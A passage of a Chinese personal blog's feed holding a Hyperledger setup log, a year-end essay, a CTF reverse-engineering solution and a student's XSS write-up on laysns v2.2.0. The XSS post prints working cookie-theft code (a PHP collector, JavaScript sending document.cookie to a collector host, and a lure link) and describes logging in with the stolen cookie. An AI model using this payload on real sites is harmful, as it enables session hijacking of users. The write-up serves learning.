class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">90</span><br><span class="line">===================== Query successful on peer1.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">========= All GOOD, BYFN execution completed =========== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> _____   _   _   ____   </span><br><span class="line">| ____| | \ | | |  _ \  </span><br><span class="line">|  _|   |  \| | | | | | </span><br><span class="line">| |___  | |\  | | |_| | </span><br><span class="line">|_____| |_| \_| |____/</span><br></pre></td></tr></table></figure><h4 id="4、关闭网络"><a href="#4、关闭网络" class="headerlink" title="4、关闭网络"></a>4、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m up -c mytest1</span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Stopping cli                    ... done</span><br><span class="line">Stopping peer0.org1.example.com ... done</span><br><span class="line">Stopping orderer.example.com    ... done</span><br><span class="line">Stopping peer0.org2.example.com ... done</span><br><span class="line">Stopping peer1.org1.example.com ... done</span><br><span class="line">Stopping peer1.org2.example.com ... done</span><br><span class="line">Removing cli                    ... done</span><br><span class="line">Removing peer0.org1.example.com ... done</span><br><span class="line">Removing orderer.example.com    ... done</span><br><span class="line">Removing peer0.org2.example.com ... done</span><br><span class="line">Removing peer1.org1.example.com ... done</span><br><span class="line">Removing peer1.org2.example.com ... done</span><br><span class="line">Removing network net_byfn</span><br><span class="line">Removing volume net_peer0.org3.example.com</span><br><span class="line">WARNING: Volume net_peer0.org3.example.com not found.</span><br><span class="line">Removing volume net_peer1.org3.example.com</span><br><span class="line">WARNING: Volume net_peer1.org3.example.com not found.</span><br><span class="line">Removing volume net_orderer.example.com</span><br><span class="line">Removing volume net_peer0.org2.example.com</span><br><span class="line">Removing volume net_peer0.org1.example.com</span><br><span class="line">Removing volume net_peer1.org1.example.com</span><br><span class="line">Removing volume net_peer1.org2.example.com</span><br><span class="line">bf5553092b5a</span><br><span class="line">0198acc0e83e</span><br><span class="line">5c0dad0e5b89</span><br><span class="line">Untagged: dev-peer1.org2.example.com-mycc-1.0-26c2ef32838554aac4f7ad6f100aca865e87959c9a126e86d764c8d01f8346ab:latest</span><br><span class="line">Deleted: sha256:b550da58d9213e0d82d7f362212eb84f8bffa0d7751cdfcbaf3258ef75c3f24a</span><br><span class="line">Deleted: sha256:d7dced24e5ba3373a3c3bd736be0a351481a21df9209503a3fa93635e4aa7f46</span><br><span class="line">Deleted: sha256:36739293e8852c3feb37dd3e08eb20f3004494d8eec3cba05c134454178323b1</span><br><span class="line">Deleted: sha256:7190f5476edd042aa64c39fcf7909f194bdc10e85e02ee1cecf21add3756d8a1</span><br><span class="line">Untagged: dev-peer0.org1.example.com-mycc-1.0-384f11f484b9302df90b453200cfb25174305fce8f53f4e94d45ee3b6cab0ce9:latest</span><br><span class="line">Deleted: sha256:4db24b70e9fbd10b3b20b6255011d45ac7fb92a7ee9731b7f8cc6e681e1a0eb6</span><br><span class="line">Deleted: sha256:38880d76d92c07ca6477ab3a899d21f00f76801f05b4adb3aba58d5bcf224bde</span><br><span class="line">Deleted: sha256:23a054642ba1b7f84991df2611f22b2a0894ea81676ecc9bc124f50832d04f12</span><br><span class="line">Deleted: sha256:f1811e1e4784e9e4537e98ba4a1bb86e56ee070ea443a026dc61c1375d6f8c30</span><br><span class="line">Untagged: dev-peer0.org2.example.com-mycc-1.0-15b571b3ce849066b7ec74497da3b27e54e0df1345daff3951b94245ce09c42b:latest</span><br><span class="line">Deleted: sha256:0c1d56951ae35a8d9db90dc3decda420ca2cf0fcbaa8ccbc4aa580de9fdd58f0</span><br><span class="line">Deleted: sha256:4ccfcafb3212b0448c0a106f25f91c59c56d709fd374658d814ba853bc315991</span><br><span class="line">Deleted: sha256:51b7b0c6e633a94040cb799596a52a13480b3b90819594d5f5c5f17b1ecdc632</span><br><span class="line">Deleted: sha256:11473124d5b1ddfe7136f913791002059bbe8d466e2a931a87caf50e6166996f</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、准备阶段&quot;&gt;&lt;a href=&quot;#一、准备阶段&quot; class=&quot;headerlink&quot; title=&quot;一、准备阶段&quot;&gt;&lt;/a&gt;一、准备阶段&lt;/h3&gt;&lt;h4 id=&quot;1、系统软件源改为-aliyun&quot;&gt;&lt;a href=&quot;#1、系统软件源改为-aliyun&quot; cla
      
    
    </summary>
    
      <category term="区块链学习" scheme="https://j-kangel.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="blockchain" scheme="https://j-kangel.github.io/tags/blockchain/"/>
    
      <category term="hyperledger" scheme="https://j-kangel.github.io/tags/hyperledger/"/>
    
  </entry>
  
  <entry>
    <title>2019</title>
    <link href="https://j-kangel.github.io/2018/12/31/2018/"/>
    <id>https://j-kangel.github.io/2018/12/31/2018/</id>
    <published>2018-12-31T13:25:54.000Z</published>
    <updated>2019-04-04T06:52:27.487Z</updated>
    
    <content type="html"><![CDATA[<p>今天是2018年最后一天，也没多大感慨，只是闲得慌，随便瞎扯两句。我这人没有什么规划和目标，主要还是前方一片迷茫，没有具体的方向，所以2018所发生的事情大多是我没有预料到的。就像我现在一样，对2019并没有什么特别的期待。计划总是赶不上变化，遇见未知的自己又何尝不好呢？</p><p>我的2018还要从去年学校跨年晚会的那一刻说起，那是和轮滑社的朋友一起跨年，第一次体验学校的跨年晚会，和几个老朋友互道了新年快乐，然后就睡了。接下来的日子一如往昔，并没有什么特别的惊喜。</p><p>元旦到了基本就是要迎接期末考试了，于是大二上结束了，从后面的结果来看，我的考试还算顺利。我又在学校多呆了十天，主要是考科三。一切都很顺利，科三一遍过。后来暑假考了科四，2018，我拿到了驾驶证，从此再也不用担心无证驾驶被抓了。</p><p>回家之前，老爸突然说要给我买个单反。之前老爸就跟我说过，如果我大学拿到了奖学金就给我买单反。我差不多都快忘了这事，这是老爸又提起，他说：“早买早享受“。我觉得挺有道理，很多时候我们做某件事情都喜欢等，等最合适的时间，这样往往就错过了。于是，我有了自己的单反。我其实很早之前就想拥有一款单反，我喜欢照片最本真的样子。然后第二天就去了趟鼓浪屿，想去给相机开开光。那天下起“了小雨，虽然光源不太充足，但是也别有一般趣味。”群芳不厌寒中开，只为翘首盼君来。今日料知君将近，忙引甘露惹尘埃。“我写下了这首小诗来表达心中的喜悦。有人说，眼睛是天然的照相机。这句话不假。我觉得能拍出好的照片的有两种人，一种是学会创造美的人人，一种是发现美的人。想要拍出好的照片，首先眼睛里要有美的存在。眼睛用来发现美，相机用来定格美，如此，生活便美不胜收。</p><p>过年自然是要回家的。还是如往年一年，过年并没有多大的趣味，见几个老友，吹几场牛逼。但是2018不一样，没有趣味，但有感伤。姐姐出嫁了。我清楚的记得那天，上午还是热热闹闹的，等婚车把姐姐接走后，屋里边空荡荡的。老妈倚在门口，对我说：“家里突然少了个人还真有点不习惯”。我那天说了很少的话，姐姐被接走后，我点起了一根烟，发现尼古丁和焦油并没有大家说的那么神奇。后来喝了点啤酒，我其实是不抽烟也不喝酒的。然后头昏昏沉沉的就睡过去了。醒来发现还是空荡荡的。“人生几次此阵容，锣敲鼓捶，似烈马惊鸿。楼上郎妾秋波送，席间宾客欢声浓。 谁知喜事皆倥偬，苦烟浊酒，无济心事重。误以醉梦可消茕，醒来仍旧一场空。”只好填此《蝶恋花》聊以慰藉。</p><p>开学了，刚开始还是很舒服的，周末爬山去植物园，写了一篇小记：</p><p>”寒冬已逝，暖春悄至。恰近日，有灰云盗日，和风藏雨。遂携二三友，作爬山寻木之行。 久居室中，竟不知草木之涩，树花之美。每行两步，便惊于木叶之奇妆，叹于山间之空旷。渐行之，花欲盛，红似深宫娇娘起舞，紫如江湖侠女弄剑；树欲茂，青似少年驭马之英豪，墨如老僧念经之沉稳。至山顶，忽闻松涛阵阵，鸟声潺潺，心窃喜，此景山上有，山下哪得闻？ 置身于山中，唯愿闻之声可入耳，欲观之景可及目。故所闻所见，皆好声好色。叹之，无人之处，花开极盛！遂归记之。“</p><p>去了一次鼓浪屿拍建筑，清明去了东山岛。东山岛的海确实比厦门的好看，碧绿的海，还有贝壳可以捡。后来就渐渐进入了梦魇时期，盼望着这学期早点结束。</p><p>可能是对厦门的早餐过于失望，也可能是觉得好玩。我买了锅和油盐，然后早上就自己捣鼓早餐。有火腿、牛奶、鸡蛋、面包、水果等。体验了一把精致的生活，主要还是太麻烦，也可能是太懒，一个月之后，全部偃旗息鼓了。所以我决定，以后找个媳妇，首先教她做早餐，然后让她每天做给我吃哈哈哈。</p><p>期间过了一次生日，刚好20岁。还记得那天晚上，我在球场打球，没有任何准备。这是，体育部的一群人就冲上来了，他们手里都拿着不同的水果，水果上面写着祝福语。后来我们去了老张吃烧烤，他们还准备了蛋糕，上面写着“心之所向，身之所往”。那天确实很感动，已经很久没有什么能够打动我了。</p><p>5月11号，我去福州参加了信息安全铁人三项赛。那是我大学时期第一次参加比赛，那时的我真的是菜的抠脚，虽然现在是菜的抠手。但那次比赛之后，我有参加许多网络空间安全的比赛，渐渐的锻炼了自己，学到了不少东西，也获得不少奖项。我大学最终的方向也从此确定—-网络安全。直白点，就是黑客。这是一个漫长且有意思的事，我渐渐宅了起来，学习各种知识以及技术，希望某一天，你们懂得。。。</p><p>我有点乏了，有点写不下去了，感觉2018发生了好多事，记忆在不断交错重叠。</p><p>七月，暑假到了。我尝试留起了中分，拍了一组照片。后来姐姐生了，这意味着一个伟大的舅舅诞生了。小学期学了数据恢复，我在一张被格式化的内存卡里面会付出了300多张初中的照片。又再一次看到了青涩的自己，发现自己青涩如初。</p><p>哦，对了。2018，我听了一场GIN的演奏会，吉他上也有他的签名。我也看了一场五月天的演唱会，都是很不错的体验。</p><p>去了次婺源，徽派建筑确实像泼墨山水画。虽然没看到漫山遍野的花，但是晚秋之景也足以让人流连忘返。</p><p>后来开学了，开学之后就很少参加活动了，也很少出去玩。就感觉一直在不停的打比赛。然后就不停的拿奖哈哈，虽然奖项不高。</p><p>说起拿奖，我今年好像还拿了挺多奖的。填学年鉴定的时候，发现了一堆证书。室友看见了，说：“你怎么那么多证书？”我说：“我也不知道哪来这么多鬼东西”。然后我们就哈哈大笑。所有奖项里面最有含金量的当然是国奖，毕竟价值8000。有时候我也很奇怪，我没想过要拿国奖。在填写申请表的时候我才想到，何不试试呢?可能有运气加成，我知道自己几斤几两。</p><p>开学之前立了个flag，这学期尽量不迟到。然后，flag没倒，但是歪了。我差不多把要迟到的课都翘了，我这学期翘的课比我前20年翘的课加起来还多。翘课真的是会上瘾，人总是有侥幸心理。某次翘课没被抓，后面就会越翘越多。新年有个愿望，下学期就不翘课了。</p><p>我大概翘了一个学期的马原，因为它妨碍我搞钱了。说起搞钱，我现在不想读书不想恋爱只想搞钱。这学期除了拿奖学金，打比赛拿奖金之外，我还找了份兼职。我也不知道自己为什么会去找兼职，可能是暑假的时候玩多了太穷了吧，我还记得当时穷到把小黄的押金都退了。兼职是在一个托管班辅导小学生写作业，小学生都挺可爱的，满眼都是十多年前的自己。</p><p>还有什么呢？我记不起来了。哦，对，我买了vps，以后可以随心所欲的上外网了，我也可以“推特治国”了。2018吧，其实我觉得也不算快吧，发生了挺多事，遇见了不一样的自己。2019又会发生什么呢？谁知道呢？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天是2018年最后一天，也没多大感慨，只是闲得慌，随便瞎扯两句。我这人没有什么规划和目标，主要还是前方一片迷茫，没有具体的方向，所以2018所发生的事情大多是我没有预料到的。就像我现在一样，对2019并没有什么特别的期待。计划总是赶不上变化，遇见未知的自己又何尝不好呢？&lt;
      
    
    </summary>
    
      <category term="随笔" scheme="https://j-kangel.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="essay" scheme="https://j-kangel.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>xss_laysns</title>
    <link href="https://j-kangel.github.io/2018/12/26/xss_laysns/"/>
    <id>https://j-kangel.github.io/2018/12/26/xss_laysns/</id>
    <published>2018-12-26T14:40:22.000Z</published>
    <updated>2019-04-04T06:56:18.158Z</updated>
    
    <content type="html"><![CDATA[<p>0x00前言</p><p>这其实是电子数据取证的期末考试案例，考的是云服务器取证。看着很像有xss漏洞的样子，抱着试一试的心态测试了一下，哈哈还真有。后来上网查了一下，好像是被曝出有前台xss漏洞的laysns v2.2.0。不管了，修复是不可能去修复了，有漏洞我就先攻击一波再说。</p><p>0x01漏洞检测</p><p>看到搜索框，心中就燃起了炽烈的求知欲。前段时间有个大佬教了我一段JS代码，一直不明白什么意思，不如搜一搜。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>输入以上代码，就在按下回车的那一刻，突然弹出下面这么一个东西，下了我一跳。</p><p><img src="/2018/12/26/xss_laysns/1.png" alt=""></p><p>好了，果然存在反射型xss，开始攻击。</p><p>0x02跨站脚本攻击</p><p>在攻击之前，一直不明白，为什么这种漏洞叫Cross-site Script。一般测试都只是Script attack，并没有Cross-site。但实际攻击中的JS恶意代码肯定是在攻击者的站点下面。那么，实施什么攻击好呢？盗取cookie吧，简单又惬意。好了，不说废话了，上脚本。</p><p>首先在攻击站点创建cookie.txt用来接收cookie，创建hack.php作为手机cookie的接口，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    $cookie = $_GET[<span class="string">'q'</span>]; </span><br><span class="line"></span><br><span class="line">    var_dump($cookie); </span><br><span class="line"></span><br><span class="line">    $myFile = <span class="string">"cookie.txt"</span>; </span><br><span class="line"></span><br><span class="line">    file_put_contents($myFile, $cookie); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着创建JS脚本hack.js，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">img.src = <span class="string">"http://localhost/hack/hack.php?q="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure><p>最后创建一个HTML页面来诱导用户hack.html,代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://localhost/sns/search.html?ks=%3Cscript+</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">src%3Dhttp%3A%2F%2Flocalhost%2Fhack%2Fhack.js%3E%3C%2Fscript%3E&amp;commend=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">all&amp;ssid=s5-e&amp;search_type=item&amp;atype=&amp;filterFineness=&amp;rr=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">1&amp;pcat=food2011&amp;style=grid&amp;cat="</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>脚本准备好了，接下来就是实施攻击了，打开hack.html，点击click me，页面跳转，cookie.txt收到cookie。用该cookie进行登录。</p><p><img src="/2018/12/26/xss_laysns/2.png" alt=""></p><p>登录成功，攻击完成！</p><p>0x03结语</p><p>由于前端不是很熟，没法实现更高级的攻击，但也学习了一波xss，感受到了跨站脚本攻击的魅力。不过现在的网站，主流浏览器都有各种应对xss的防御策略，想要实施更深层的攻击，还是要继续学习！此篇博客毫无技术含量，仅作学习之余以放松。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;0x00前言&lt;/p&gt;
&lt;p&gt;这其实是电子数据取证的期末考试案例，考的是云服务器取证。看着很像有xss漏洞的样子，抱着试一试的心态测试了一下，哈哈还真有。后来上网查了一下，好像是被曝出有前台xss漏洞的laysns v2.2.0。不管了，修复是不可能去修复了，有漏洞我就先攻击
      
    
    </summary>
    
      <category term="web" scheme="https://j-kangel.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://j-kangel.github.io/tags/web/"/>
    
      <category term="xss" scheme="https://j-kangel.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>just reverse it</title>
    <link href="https://j-kangel.github.io/2018/12/10/reverse/"/>
    <id>https://j-kangel.github.io/2018/12/10/reverse/</id>
    <published>2018-12-09T20:19:25.000Z</published>
    <updated>2019-04-04T06:55:17.164Z</updated>
    
    <content type="html"><![CDATA[<p>IDA打开程序，查看start函数C伪代码。<br><img src="/2018/12/10/reverse/001.png" alt=""><br>首先来看第一个for循环，它将输入的16个字符分成4部分。v12占20字节，用来存放大小为16字节的str，sub_402573是MD5计算函数，将4个部分的MD5值存放在64字节大小的v6中。具体对应关系如下图(每一格表示一个字节)。<br><img src="/2018/12/10/reverse/002.png" alt=""></p><p>如何看出sub_402573函数是MD5算法，进入该函数，看到两个函数，进入第一个，有一些初始赋值的操作，猜测为MD5。再返回来看v6，v6占64个字节，分成四部分就是16字节，每个字节包含两个十六进制，刚好每部分可以存一个MD5值，进一步猜测为MD5算法。于是动态调试进行验证。</p><p>将程序丢入od，在call sub_402573的地方下断点，运行程序，输入“1234567890123456”，继续运行，跟踪v6所在的内存，如下图，发现与“1234”、“5678”、“9012”、“3456”的MD5值相同，验证猜测。</p><p><img src="/2018/12/10/reverse/003.png" alt=""></p><p>接着到了strtol函数，这是一个C语言库函数。这里的意思是将v12的值转化为十六进制，中间的参数‘0’表示不返回非法字符串，意味着输入的每个字符应该是十六进制字符，否则每一部分可能就少于4个字符。由图2可知v12[3]+3、v12[2]+2、v12[1]+1、v12刚好对应每一部分字符串。</p><p>sub_4025b1函数，v12[3]+3 &gt; v12[2]+2 &gt; v12[1]+1 &gt; v12 &gt; 999，保证输入顺序。</p><p><img src="/2018/12/10/reverse/004.png" alt=""></p><p>sub_402513函数，是这道题最复杂的地方。首先来看传参，a1为输入值的一部分，a2为该部分的MD5值。关于小头位序存储方式，例如1234存为0x 34 12。因此，a2&gt;&gt;4即为MD5值的第一个字符，a2&amp;0xF为第二字符，(a2+1)&gt;&gt;4为第三个字符，(a2+1)&amp;0xF为第四个字符，这里只取MD5前四个字符作比较。</p><p>数字+48和字母+87是将十六进制转为assic码(ord(‘0’-0)=48，ord(‘a’-a)=87)。</p><p>v3是int型，占四个字节，分别为LOBYTE、BYTE1,、BYTE2、BYTE3。因此是将MD5值的3241与原字符串1234作比较，相等则为真。</p><p><img src="/2018/12/10/reverse/005.png" alt=""></p><p>最后和固定字符串进行异或得到flag，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                                md5=hashlib.md5()</span><br><span class="line">                                md5.update((i+j+k+l).encode(<span class="string">'utf8'</span>))</span><br><span class="line">                                <span class="keyword">if</span> md5.hexdigest()[:<span class="number">4</span>]==l+j+i+k:</span><br><span class="line">                                        sys.stdout.write(i+j+k+l)</span><br><span class="line"></span><br><span class="line">v3 = <span class="string">"d\x01@flQAizAST\biTB"</span></span><br><span class="line">a = <span class="string">"31795a469327c6e6"</span></span><br><span class="line">flag = strxor(v3,a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nflag&#123;%s&#125;"</span>%flag</span><br></pre></td></tr></table></figure><p>输入字符串为”31795a469327c6e6”，flag为：flag{W0w_Y0u_Crack_1t}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;IDA打开程序，查看start函数C伪代码。&lt;br&gt;&lt;img src=&quot;/2018/12/10/reverse/001.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;首先来看第一个for循环，它将输入的16个字符分成4部分。v12占20字节，用来存放大小为16字节的str，sub_402
      
    
    </summary>
    
      <category term="逆向" scheme="https://j-kangel.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="reverse" scheme="https://j-kangel.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>note</title>
    <link href="https://j-kangel.github.io/2018/11/26/note/"/>
    <id>https://j-kangel.github.io/2018/11/26/note/</id>
    <published>2018-11-25T22:57:17.000Z</published>
    <updated>2019-04-04T06:54:10.144Z</updated>
    
    <content type="html"><![CDATA[<p>life is beautiful!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;life is beautiful!&lt;/p&gt;

      
    
    </summary>
    
      <category term="随笔" scheme="https://j-kangel.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="note" scheme="https://j-kangel.github.io/tags/note/"/>
    
  </entry>
  
</feed>
